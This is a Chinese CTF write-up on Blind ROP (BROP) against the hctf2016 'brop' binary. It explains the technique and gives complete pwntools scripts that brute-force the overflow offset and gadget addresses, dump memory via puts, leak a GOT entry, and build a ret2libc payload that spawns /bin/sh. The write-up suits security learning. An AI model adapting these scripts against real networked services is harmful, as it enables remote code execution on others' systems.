> 参考资料：
>
> [https://bbs.pediy.com/thread-257033.htm](https://bbs.pediy.com/thread-257033.htm)
>
> [https://github.com/firmianay/CTF-All-In-One/blob/master/doc/6.1.1_pwn_hctf2016_brop.md](https://github.com/firmianay/CTF-All-In-One/blob/master/doc/6.1.1_pwn_hctf2016_brop.md)
>
> [https://github.com/zszcr/ctfrepo/tree/master/BROP/hctf2016-brop-master](https://github.com/zszcr/ctfrepo/tree/master/BROP/hctf2016-brop-master)
>
> [https://blog.csdn.net/qq_41202237/article/details/105913705](https://blog.csdn.net/qq_41202237/article/details/105913705)
>
> 附件下载：
>
> 链接：[https://pan.baidu.com/s/1-QpEJ8r5tmMu5Wm8h6DK2Q](https://pan.baidu.com/s/1-QpEJ8r5tmMu5Wm8h6DK2Q)
>
> 提取码：8jlq
>

> 文件说明：libc文件为Ubuntu 16.04自带的未更新版本
>

# 前言
将文件从附件之中下载下来，由于这道题是BROP，因此我们没有ELF文件，进一步说我们没有办法检查文件保护和查看它的伪代码。

---

> 此题本来要使用socat远程转发，可是在第一步测栈偏移出现了问题，每次测的栈偏移都不一样，因此被迫本地pwn。
>

socat安装使用方法（ubuntu）：

执行命令：

（安装）sudo apt-get install socat

（端口转发：socat tcp-l:10001,fork exec:./brop）

此时在另一台虚拟机中进行链接：nc 192.168.133.128 10001（nc IP地址 端口）当出现下面的提示时，就表示成功了：

 ![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597376303078-3e2e819e-b5a5-4fc6-85f9-0660017e542f.png)

网上有人在复现环境时说socat在程序崩溃时会断开连接，但我并未出现这种情况，如果你在复现时出现了程序崩溃导致socat断开连接的情况，需要写一个脚本，帮助socat重新启动连接，脚本代码如下：

```python
#!/bin/sh
while true; do
        num=`ps -ef | grep "socat" | grep -v "grep" | wc -l`
        if [ $num -lt 5 ]; then
                socat tcp4-listen:10001,reuseaddr,fork exec:./a.out &
        fi
done
```

---

记住，这是BROP，无法使用IDA，无法检查文件的保护。

# BROP的简介
**<font style="color:#F5222D;">BROP全称为"Blind ROP"</font>**，一般在我们无法获得二进制文件的情况下利用ROP进行远程攻击某个应用程序，劫持该应用程序的控制流，**<font style="color:#F5222D;">我们可以不需要知道该应用程序的源代码或者任何二进制代码</font>**，该应用程序可以被现有的一些保护机制，诸如NX, ASLR, PIE, 以及stack canaries等保护，应用程序所在的服务器可以是32位系统或者64位系统，BROP这一概念在2014年由Standford的Andrea Bittau发表在Oakland 2014的论文Hacking Blind中提出。

> <font style="color:#000000;background-color:#FAFAFA;">论文地址：</font>[Hacking Blind](http://www.scs.stanford.edu/brop/bittau-brop.pdf)
>

# BROP攻击条件
+ 程序必须存在栈溢出
+ 服务器端的进程会在崩溃之后重新启动，并且重新启动的进程的地址与先前的地址一样，也就是说即使程序有ASLR保护，但是保护仅仅只对程序最初启动的时候有效。现在nginx、MySQL、Apache、OpenSSH等服务器都符合这种特性

# BROP攻击思路
因此BROP的攻击思路一般有以下几个步骤：

1. 暴力枚举，获取栈溢出长度，如果程序开启了Canary ，顺便将canary也可以爆出来
2. 寻找可以**<font style="color:#F5222D;">返回到程序main函数的gadget</font>**,通常被称为stop_gadget
3. 利用stop_gadget寻找可利用(potentially useful)gadgets，如:pop rdi; ret
4. 寻找BROP Gadget，可能需要诸如write、put等函数的系统调用
5. 寻找相应的PLT地址
6. dump远程内存空间
7. 拿到相应的GOT内容后，泄露出libc的内存信息，最后利用rop完成getshell

**知识点1-stop_gadget：**一般情况下，如果我们把栈上的return address覆盖成某些我们随意选取的内存地址的话，程序有很大可能性会挂掉（比如，该return address指向了一段代码区域，里面会有一些对空指针的访问造成程序crash，从而使得攻击者的连接（connection）被关闭）。但是，**<font style="color:#F5222D;">存在另外一种情况，即该return address指向了一块代码区域，当程序的执行流跳到那段区域之后，程序并不会crash，而是进入了无限循环，这时程序仅仅是hang在了那里，攻击者能够一直保持连接状态。</font>**于是，我们把这种类型的gadget，成为stop gadget，这种gadget对于寻找其他gadgets取到了至关重要的作用。

**知识点2-可利用的(potentially useful)gadgets**：假设现在我们猜到某个useful gadget，比如pop rdi; ret, 但**<font style="color:#F5222D;">是由于在执行完这个gadget之后进程还会跳到栈上的下一个地址，如果该地址是一个非法地址，那么进程最后还是会crash</font>**，在这个过程中攻击者其实并不知道这个useful gadget被执行过了（因为在攻击者看来最后的效果都是进程crash了），因此攻击者就会认为在这个过程中并没有执行到任何的useful gadget，从而放弃它。这个步骤如下图所示：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597377100636-33319405-9547-4919-a270-f2fe4824a357.png)

但是，如果我们有了stop gadget，那么整个过程将会很不一样. 如果我们在需要尝试的return address之后填上了足够多的stop gadgets，如下图所示：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597377130634-156ce4d0-f825-44ce-9963-c6ef3af7bee1.png)

> 那么任何会造成进程crash的gadget最后还是会造成进程crash，而那些useful gadget则会进入block状态。尽管如此，还是有一种特殊情况，即那个我们需要尝试的gadget也是一个stop gadget，那么如上所述，它也会被我们标识为useful gadget。不过这并没有关系，因为之后我们还是需要检查该useful gadget是否是我们想要的gadget。
>

# 利用IDA查看溢出点
虽然这是Blind ROP，我们在做题的时候看不见任何的代码。但是为了更好的展现这道题，还是使用IDA查看一下溢出点，方便讲解，题目的源代码如下：

```python
#include <stdio.h>
#include <unistd.h>
#include <string.h>
int i;
int check();
int main(void){
	setbuf(stdin,NULL);
	setbuf(stdout,NULL);
	setbuf(stderr,NULL);
    puts("WelCome my friend,Do you know password?");
	if(!check()){
        puts("Do not dump my memory");
	}else {
        puts("No password, no game");
	}
}
int check(){
    char buf[50];
    read(STDIN_FILENO,buf,1024);
    return strcmp(buf,"aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk");
}
```

其中在check函数中有：

```python
int check(){
    char buf[50];
    read(STDIN_FILENO,buf,1024);
    return strcmp(buf,"aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk");
}
```

可以清晰的看到，定义了buf[50]，但是可以read 1024字节，很明显可以发生栈溢出。

---

# 检查文件的保护情况
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598322365197-e9466e9f-2663-4b88-bceb-ce72d8beb752.png)

可以看到64位程序，NX栈不可执行保护开启了，所以无法在栈中部署shellcode，因此可以考虑使用gadget。但是由于看不到程序本身的二进制代码，所以只能使用暴力穷举的方式不断的穷举地址，并根据不同的返回结果做出判断，该地址是不是我们想要的gadget。而且可以看到PIE没有开启，并且提示程序初始地址为0x400000

# 解答思路
控制puts函数打印出自身的got表地址，通过got地址利用LibcSearcher计算出当前使用的libc版本，接着找到system函数和/bin/sh地址部署到栈中执行

# 解答步骤
## 1、暴力枚举出栈溢出长度
判断栈溢出可以通过循环不断的增加输入字符的长度，直至程序崩溃

我们先运行一下程序试试，看看程序流程：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598322706838-8d3f0bb6-7554-4764-b781-24b5e9b94a76.png)

可见，当我们输入123456时，会提示“No password, no game”的字样

接下来我们输入200个字符：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598322847829-b0f6d14b-1224-4f43-9d4b-8243b292721f.png)

从上图中我们可以看到，输入一串特别长的字符串的时候没有出现“No password, no game”的字样，那么我们就可以使用循环来不断增加字符串长度，并且根据回显结果中是否有“No password, no game”字样来判断到什么长度覆盖了ret返回地址，并且该长度**<font style="color:#F5222D;">减一</font>**就是栈溢出的长度。

可以得出结论：

循环内容：累加输入字符串长度，填满栈空间

循环终止条件：回显结果起始位置字符串为No password, no game

执行目的：确定栈溢出长度，为后续所有步骤做准备

exp如下：

```python
from pwn import*
def getsize():
    i = 1
    while 1:
        try:
            p = process('./brop') #本地链接程序
            p.recvuntil("WelCome my friend,Do you know password?\n")
            payload=i*'a' #不断增加a的数量输入到程序中
            print "Now,The payload is",payload
            p.send(payload)
            data = p.recv()  #将获取到的回显内容放在data变量中
            p.close()
            if not data.startswith('No password'):
                #判断output变量中起始位置是不是No password，如果不是说明已经溢出了
                return i-1
            else:
                i+=1
                print "Adding the number of 'a' in payload..."
        except EOFError:
            p.close()
            print "Success,EOFError,Stack is overflow..."
            return i-1
 
size = getsize()
print "Stack size is ",size
```

> 简单的说一下这个exp：在每次执行时，payload的a的数目会随着循环的次数所增加，如果触发了EOFError异常，说明出现了栈溢出，因此返回i-1，反之如果输出No password，则此payload无法使程序溢出
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597379878521-730b5086-5350-4ef1-a04f-98be3a54baf6.png)

可以得出栈偏移为72，要注意的是，崩溃意味着我们覆盖到了返回地址，所以缓冲区应该是发送的字符数减一，即 buf(64)+ebp(8)=72。该题并没有开启 Canary，所以跳过爆破Canary的过程。

画个图来表示一下栈中的情况：

```python
                       +---------------------------+
                       |           ret             | 
                       +---------------------------+
                       |            a              | 递增a字符串覆盖ebp位置
                ebp--->+---------------------------+
                       |            a+             | 递增a字符串占位填满栈空间
                       |           ....            |        .....
                       |            a+             | 递增a字符串占位填满栈空间
                       |            a+             | 递增a字符串占位填满栈空间
                       |            a+             | 递增a字符串占位填满栈空间
                       |            a+             | 递增a字符串占位填满栈空间
     		   input-->+---------------------------+

```

## 2、寻找stop gadget
当我们想办法寻找gadget的时候，并不知道程序具体是什么样的，所以需要控制返回地址进而去猜测gadget。那当我们控制返回地址时，一般会出现三种情况

+ 程序直接崩溃：ret地址指向的是一个程序内不存在的地址
+ 程序运行一段时间后崩溃：比如运行自己构造的函数，该函数的返回地址指向不存在的地址
+ 程序一直运行而不崩溃

stop gadget一般指的是，但程序执行这段代码时，程序进入无限循环，这样使得攻击者能够一直保持连接状态，并且程序一直运行而不崩溃。就像蛇吃自己的尾巴一样，stop gadget最后的ret结尾地址就是程序开启的地址（比如main函数地址）

由于看不到二进制程序所以依然还需要使用穷举的方式不断的尝试每一个地址，所以我们从初始的地址0x400000开始，通过循环，不断累加地址进行尝试（前面检测程序保护讲了为什么初始地址是0x400000）。有了循环之后就需要考虑循环终止条件，终止条件可以参考stop gadget的特性：在执行stop gadget的时候程序会回到初始状态并且没有发生崩溃。那么我们可以利用这一特性，使用前面找到的72字节填满栈空间，之后接上穷举的地址，此时穷举地址覆盖了ret地址，那么接下来就会执行穷举地址，如果此时程序发生崩溃就进行下一次循环，如果没有崩溃则打印该地址

循环内容：递增地址，尝试可能的stop gadget

循环终止条件：程序不发生崩溃

执行目的：确定stop gadget为后面查找brop gadget、puts plt、puts got做准备

exp如下：

```python
from pwn import *
 
def get_stop():
    addr = 0x400000
    while 1:
        sleep(0.1)
        addr += 1
        try:
            print "Now,trying the address is ",hex(addr)
            p = process('./brop')
            p.recvuntil("WelCome my friend,Do you know password?\n")
            payload = 'a'*72 + p64(addr)
            print "Now,the payload is ",payload
            p.sendline(payload)
            data = p.recv()
            p.close()
            if data.startswith('WelCome'):
                return addr
            else:
                print "Find one success addr : 0x%x"%(addr)
        except EOFError as e:
            p.close()
            print "Find a Bad addr,that is :0x%x and try next address"%addr
        except:
            print "Can't connect,retrying..."
            addr -= 1
 
data = get_stop()
print "Success,call Main Funciton address is %s"%hex(data)
```

得到stop_gadget地址为0x4005d0

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598330051694-522546ee-a2fb-4ade-8ba8-8246a5052169.png)

我们可以在IDA中看一下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598330118013-5a559455-1533-4f1a-a642-8fcaefda2636.png)

可以看到，这正是调用main function的地址

此时的栈情况如下：

```python
                       +---------------------------+
                       |        0x400000+          | 递增地址覆盖原ret返回位置
                       +---------------------------+
                       |             a             | a字符覆盖ebp位置
                ebp--->+---------------------------+
                       |             a             | a字符覆盖ebp位置
                       |             a             | a字符覆盖ebp位置
                       |             a             | a字符覆盖ebp位置
                       |             a             | a字符覆盖ebp位置
                       |             a             | a字符覆盖ebp位置
     		  input-->+---------------------------+

```

## 3、寻找brop gadget
在前面找到了stop gadget我们怎么去利用他呢，这时候就需要找到能够控制寄存器的gadget。由于我们的计划是利用puts函数打印出自己的got地址，通过got地址找到对应的libc版本，然后找到system函数和/bin/sh地址部署到栈中执行。那么需要考虑的一点是在调用puts函数之前需要将打印的内容压进rdi寄存器中，那么我们首先就需要通过gadget来控制rdi寄存器。

其实在libc_csu_init的结尾一长串pop的gadget中，通过偏移可以得到pop rdi的操作

```python
                    +---------------------------+  
                    |         pop rbx           |  0x00
                    +---------------------------+
                    |         pop rbp           |  0x01
                    +---------------------------+
                    |         pop r12           |  0x02
                    +---------------------------+
                    |         pop r13           |  0x04
                    +---------------------------+
                    |         pop r14           |  0x06			
                    +---------------------------+------------------->pop rsi;ret 0x07
                    |         pop r15           |  0x08			  
                    +---------------------------+------------------->pop rdi;ret 0x09
                    |           ret             |  0x10								
                    -----------------------------
```

可以看到如果以pop rbx为基地址的话向下偏移0x7会得到pop rsi的操作，向下偏移0x9会得到pop rdi的操作（也就是平常所说的gadgets）。这两个操作就可以帮助我们控制puts函数的输出内容。程序的gadgets：

```python
ubuntu@ubuntu:~/Desktop$ ROPgadget --binary brop --only 'pop|ret'
Gadgets information
============================================================
0x00000000004007bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007be : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007c0 : pop r14 ; pop r15 ; ret
0x00000000004007c2 : pop r15 ; ret
0x00000000004007bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007bf : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400615 : pop rbp ; ret
0x00000000004007c3 : pop rdi ; ret
0x00000000004007c1 : pop rsi ; pop r15 ; ret
0x00000000004007bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400559 : ret
0x0000000000400645 : ret 0xc148

Unique gadgets found: 12
ubuntu@ubuntu:~/Desktop$ 
```

那么往回想既然我们需要用到pop rdi、rsi的操作就需要知道libc_csu_init结尾6个pop操作的位置。这个时候我们的stop gadget就派上用场了，为了更好地演示stop gadget的使用，这里定义栈上的三种地址

+ Probe
    - 探针，也就是我们想要循环递增的代码地址。一般来说都是64位程序，可以直接从0x400000尝试
+ Stop
    - 不会使得程序崩溃的stop gadget的地址
+ Trap
    - 可以导致程序崩溃的地址

我们可以通过在栈上拜访不同程序的Stop与Trap从而来识别出正在执行的指令，举几个例子

+ probe, stop, traps, (traps, traps, …)以这样的方式进行排列，可以看一下在栈中的排列

```python
   +---------------------------+ 
   |          traps            | <----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
   +---------------------------+
   |           ....            | <----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
   +---------------------------+
   |          traps            | <----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
   +---------------------------+
   |          traps            | <----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
   +---------------------------+
   |          traps            | <----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
   +---------------------------+
   |          stop             | <----- stop gadget，不会使程序崩溃，作为probe的ret位
   +---------------------------+
   |          probe            | <----- 探针
   -----------------------------
```

我们可以通过程序是否崩溃来判断probe探针中可能存在的汇编语句，在这样布局的情况下，如果程序没有崩溃，说明stop gadget被执行了。说明了probe探针中没有pop操作，并且有ret返回，如果有pop操作的话stop会被pop进寄存器当中，那么probe探针的ret返回就会指向stop的后几位traps，那么就会导致程序崩溃。那么由于在栈布局中stop gadget在probe探针的下一位，说明stop所在位置就是probe探针的ret返回地址位置。如：

> pop rax; ret
>
> pop rdi; ret
>

probe, trap, trap, trap, trap, trap, trap, stop, traps以这样的方式进行排列，可以看一下在栈中的排列

```python
   +---------------------------+ 
   |           traps           | <----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
   +---------------------------+ 
   |           stop            | <----- stop gadget，不会使程序崩溃，作为probe的ret位
   +---------------------------+ 
   |           trap            | <----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
   +---------------------------+
   |           trap            | <----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
   +---------------------------+
   |           trap            | <----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
   +---------------------------+
   |           trap            | <----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
   +---------------------------+
   |           trap            | <----- traps，程序中不存在的地址，当IP指针指向该处时崩溃
   +---------------------------+
   |           trap            | <----- trap，程序中不存在的地址，当IP指针指向该处时崩溃
   +---------------------------+
   |           probe           | <----- 探针
   -----------------------------
```

我们可以通过程序是否崩溃来判断probe探针中可能存在的汇编语句，在这样布局的情况下，如果程序没有崩溃，说明stop gadget被执行了。说明该probe探针中存在6个pop操作，并且有ret，因为只有在6个pop操作之后probe后面的trap才能弹进寄存器，之后sp指针才能指向stop gadget，这个时候stop gadget只有在ret位置才能被执行，因此程序不会崩溃

回到我们之间说的寻找brop gadget环节，我们这个环节要找的就是libc_csu_init最后的6个pop加ret，那么根据前面的讲解我们可以大致的通过trap、stop这种方式做一个简单的排列：

addr，trap, trap, trap, trap, trap, trap, stop, traps

以上面这种排列的话，addr通过循环不断增加地址位，只有addr所在地址拥有6个pop操作并ret的时候才会执行stopgadget。

循环内容：递增地址，找到可以执行6个pop和一个ret操作的gadget

循环终止条件：程序不崩溃，并出现起始的输出提示’WelCome’字符

执行目的：找到libc_csu_init函数的最后一个gadget，通过偏移计算出pop rdi地址

```python
# coding=utf-8
from pwn import *
context.log_level = "debug"

def get_brop_gadget(length,stop_gadget,addr):
    try:
        p = process('./brop')
        p.recvuntil("WelCome my friend,Do you know password?\n")
        payload = 'a'*length + p64(addr) + p64(0)*6 + p64(stop_gadget)
        #payload中填充任意6个字符就行
        #通过72个a填满栈空间到ret，增长的地址覆盖原有的ret地址，
        #接着用6个字符的p64形式充当trap，最后接上stop
        p.sendline(payload)
        content = p.recv()
        p.close()
        print content
        if not content.startswith('WelCome'):
            #判断提示符是否出现起始提示字符，如果有说明程序没崩溃
            return False
        return True
    except Exception:
        p.close()
        return False

def check_brop_gadget(length,addr):#检查地址
    try:
        p = process('./brop')
        p.recvuntil("password?\n")
        payload = 'a'*length + p64(addr) + 'a'*8*10
        p.sendline(payload)
        content = p.recv()
        p.close()
        return False
    except Exception:
        p.close()
        return True

length = 72
stop_gadget = 0x4005d0
'''
理论上应该从0x400000开始寻找，但是这个环节要找的是Libc_csu_init函数，
所以大多数的libc中Libc_csu_init函数的起始地址都在0x400740之后，所以为了减少误差，
从0x400750开始
'''
addr = 0x400750
f = open('brop.txt','w')
while 1:
    print hex(addr)
    if get_brop_gadget(length,stop_gadget, addr):
        print "possible stop_gadget :0x%x"%addr
        if check_brop_gadget(length,addr):
            print "success brop gadget:0x%x"%addr
            f.write("success brop gadget :0x%x"%addr + "\n")
            break
    addr += 1

f.close()

#brop gadget -->[0x4007ba]
```

运行结果如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598330514381-15827f41-cb6b-4e58-affe-f51ba822e1fa.png)

运行之后会得到很多的gadget地址，但是只有0x4007ba是可以继续进行操作的，如果想找到更多的gadget地址可以参考寻找stop gadget方法。但是经过后面内容的联合使用，只有0x4007ba可以执行。可以看一下IDA

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598330602492-b7fa8db5-7977-475a-9a27-73e8121fec49.png)

可以在IDA中看到0x4007ba处却是是libc_csu_init的gadget，实际操作中看不到二进制文件，这里使用IDA只是为了演示的更直观

栈中布局

```python
                       +---------------------------+
                       |       		 0    	       | trap
                       +---------------------------+
                       |       	   .....           | trap
                       +---------------------------+
                       |       		 0    	       | trap
                       +---------------------------+
                       |       	stop gadget        | stop gadget作为ret返回地址
                       +---------------------------+
                       |       		 0    	       | trap
                       +---------------------------+
                       |       		 0    	       | trap
                       +---------------------------+
                       |       		 0    	       | trap
                       +---------------------------+
                       |       		 0    	       | trap
                       +---------------------------+
                       |       		 0    	       | trap
                       +---------------------------+
                       |       		 0    	       | trap
                       +---------------------------+
                       |         0x400740+         | 递增地址覆盖原ret返回位置
                       +---------------------------+
                       |             a             | a字符串覆盖原saved ebp位置
                ebp--->+---------------------------+
                       |             a             | a字符串占位填满栈空间
                       |           ....            |        .....
                       |             a             | a字符串占位填满栈空间
                       |             a             | a字符串占位填满栈空间
                       |             a             | a字符串占位填满栈空间
                       |             a             | a字符串占位填满栈空间
     	   our input-->+---------------------------+

```

在我们找到brop gadget之后加上0x9的偏移就可以得到pop rdi；ret操作的地址0x4007c3

## 4、寻找puts@plt地址
通过前面的操作，我们可以总结一些规律，比如我们需要什么就把他扔进循环递增，总会有一次循环会得到我们想要的结果，在上一步我们找到了pop rdi；ret这个gadget的地址了，那么我们就可以控制puts函数的输出内容。我们就需要用这个gadget找到puts_plt的地址

根据上面所说的如果我们调用puts函数，必须将puts函数的参数地址先部署进rdi寄存器中，然后调用puts函数将rdi中地址内的参数打印出来

但是由于开启了NX保护，所以我们无法在栈中部署外部的变量或者字符串，那么我们就需要一个程序内部的特殊字符串，并且这个字符串必须唯一的。这里介绍一下，在没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为’ \ x7fELF’

循环内容：递增地址，找到可以进行打印的puts_plt地址

循环终止条件：接收字符串出现’\ x7fELF’字样

执行目的：为后续找到puts_got地址做准备

```python
# coding=utf-8
from pwn import *
context.log_level = "debug"

def get_puts(length,rdi_ret,stop_gaddet):
    addr = 0x400000
    while 1:
        print hex(addr)
        p = process('./brop')
        p.recvuntil('password?\n')
        payload = 'a'*length + p64(rdi_ret) + p64(0x400000)+p64(addr) + p64(stop_gadget)
#72个A填充栈空间，调用pop rdi；ret gadget将0x400000pop进rdi寄存器，
#循环增长的地址放在gadget的ret位置，在执行完gadget后直接调用循环增长的地址，
#如果增长到puts_plt地址就会打印rdi寄存器中地址内存放的字符串，
#最后的stop gadget是为了让程序不崩溃    
        p.sendline(payload)
        try:
            content = p.recv()
            if content.startswith('\x7fELF'):
                #判断是否打印\x7fELF
                print 'find puts@plt addr : 0x%x'%addr
                return addr
            p.close()
            addr+=1
        except Exception:
            p.close()
            addr+=1

length = 72
rdi_ret = 0x4007ba + 0x9
stop_gadget = 0x4005d0
puts = get_puts(length,rdi_ret,stop_gadget)
#find puts_add --> [0x400565]
#puts_plt = 0x400560
```

运行结果如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598331919861-d4be012d-99a1-4180-abeb-421de85f8d45.png)

最后根据plt的结构，选择0x400570作为puts_plt的地址，我们使用IDA验证一下

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598355290703-7d12193e-c01b-4a99-9642-2ba462e8f99c.png)

可以看到该地址却是是puts函数的plt地址，正常情况下是看不到二进制文件的，此处看IDA是为了更好的讲解

栈中布局：

```python
                       +---------------------------+
                       |       	stop gadget        | stop gadget确保程序不崩溃
                       +---------------------------+
                       |       	  0x400000+        | 循环递增地址，作为pop的ret地址
                       +---------------------------+
                       |          0x400000 	       | ELF起始地址，地址内存放'\x7fELF'
                       +---------------------------+
                       |          0x4007c3         | pop rdi；ret地址覆盖原ret返回位置
                       +---------------------------+
                       |             a             | a字符串覆盖ebp位置
                ebp--->+---------------------------+
                       |             a             | a字符串占位填满栈空间
                       |           ....            |        .....
                       |             a             | a字符串占位填满栈空间
                       |             a             | a字符串占位填满栈空间
                       |             a             | a字符串占位填满栈空间
                       |             a             | a字符串占位填满栈空间
     	   our input-->+---------------------------+

```

## 5、泄露puts_got地址
在得到puts_plt地址后，接下来就需要将puts_got地址泄露出来，得到puts_got地址之后就可以利用LibcSearcher查找对应的libc版本，再根据版本找到libc中的system函数和/bin/sh

在泄露之前需要知道一下Linux中plt表和got表的关系，我们就拿puts函数举例

```python
																	+--------------+
																	|    GOT表     |
+---------------------+				+--------------+	找到真实地址  +--------------+
|  PLT表  | jmp got表  | --------->  |puts的真实地址 | -------------> |    puts函数   |
+---------------------+				+--------------+			    +--------------+
跳转到got表中存放puts						                           |			  |
函数真实地址的地址								                      |			     |
																	+--------------+

```

我们可以根据上图我们模拟一下call puts的过程，在执行call puts之后程序首先会在PLT表中寻找puts_plt的地址，那么在puts_plt地址中存放的是GOT表中存放puts函数真实地址的地址（可能有点套娃，慢慢想），接下来会在GOT表中找到存放puts真实地址的地址，接下来打开盒子根据真实找到了puts函数

在ret2csu中我们使用的是LibcSearcher查找的函数got表地址，那么由于这道题开启了ASLR，所以不能使用工具去获取地址，那么我们手动的去找，找的就是在puts_plt地址中存放的jmp指令后接的地址。如果觉得不懂，看一下上面的图，jmp指令后面接的就是puts_got的地址。由于不能实用工具，我们只能手动的讲整个PLT部分都dump出来。dump出来的文件重新设置基地址0x400000，再根据前面得到的puts_plt地址找到对应位置，查看该地址内的汇编指令

```python
# coding=utf-8
from pwn import *
context.log_level = "debug"
'''
dump the bin file
'''
def leak(length,rdi_ret,puts_plt,leak_addr,stop_gadget):
    p = process('./brop')
    payload = 'a'*length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)
    #72个a填满栈空间至ret位置，后接pop rdi；ret gadget，循环递增的地址被pop进rdi寄存器，
    #接下来将puts_plt地址防止在gadget ret位置进行调用打印循环递增的地址，
    #最后加上stop gadget防止崩溃
    p.recvuntil('password?\n')
    p.sendline(payload)
    try:
        data = p.recv(timeout = 0.1)
        p.close()
        try:
            data = data[:data.index("\nWelCome")]#将接收的\nWelCome之前的字符串交给data变量
        except Exception:
            data = data
        if data =="":#如果data被赋值之后为空，那么就说明已经完成整个dump过程，添加\x00截断
            data = '\x00'
        return data
    except Exception:
        p.close()
        return None   

length = 72
stop_gadget = 0x4005d0
brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
puts_plt = 0x400565
addr = 0x400000
result = '' #准备一个空字符串接收dump出来的代码
while addr < 0x401000: #从0x400000开始泄露0x1000个字节，足以包含程序的plt部分
    print hex(addr)
    data = leak(length,rdi_ret,puts_plt,addr,stop_gadget)
    if data is None:#判断接收字符是否为空
        result += '\x00'
        addr += 1
        continue
    else:
        result += data#接收字符串
    addr += len(data)#addr+接收字符串个数，避免接收重复的字符串

with open('dump','wb') as f:#在当前目录下以二进制形式向dump文件中写
    f.write(result)
```

在执行完后会在本地当前目录下得到一个名为"dump"的文件:

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598333680757-d4ad14ca-c7b7-4002-8a57-57f8208c5e5a.png)

这个文件就是我们dump出来的文件，其实你可以把他比作Windows下脱壳之后的文件。虽然在实际情况下我们看不到二进制文件，但是我们dump出来的plt段的内容可以使用IDA进行查看。将hollk文件拖进64位IDA，选择binary File形式打开，选择64-bit mode

接下来需要给hollk文件设置基地址，因为我们是从0x400000处开始dump的，所以基地址就设为0x400000

设置步骤：edit->segments->rebase program 将程序的基地址改为 0x400000

由于我们之前找到了puts函数的plt地址0x400570，所以我们找到偏移0x570处

选中0x560，按c键，将此处数据转换为汇编指令

我们就可以看到puts_plt地址中jmp指令后面接的puts_got地址了，0x601018

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598355409112-155238b9-ec72-4252-9adf-27fc0fb3a54b.png)

## 6、查询libc版本
> libc版本可以在这里查询：[https://libc.blukat.me/](https://libc.blukat.me/)
>

由于我们是本地pwn，所以就不需要查询libc版本，直接调用本地的就行

## 7、getshell
```python
from pwn import*
from LibcSearcher import*
context.log_level = "debug"

p = process('./brop')
puts_plt = 0x400570
puts_got = 0x601018
brop_gadget = 0x4007ba
stop_gadget = 0x4005d0
rdi_ret = brop_gadget + 9
payload = 'a'*72 + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)
p.recvuntil("password?\n")
p.sendline(payload)
data = p.recv(6).ljust(8,'\x00')
p.recv()
puts_addr = u64(data)
print "puts address :0x%x"%puts_addr

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_base = puts_addr - libc.symbols['puts']
system  = libc_base + libc.symbols['system']
binsh = next(libc.search('/bin/sh'))+libc_base
payload = 'a'*72 + p64(rdi_ret) + p64(binsh) + p64(system) + p64(stop_gadget)
p.sendline(payload)
p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598355794910-2cbb0061-e339-459f-a624-b07bb097d825.png)





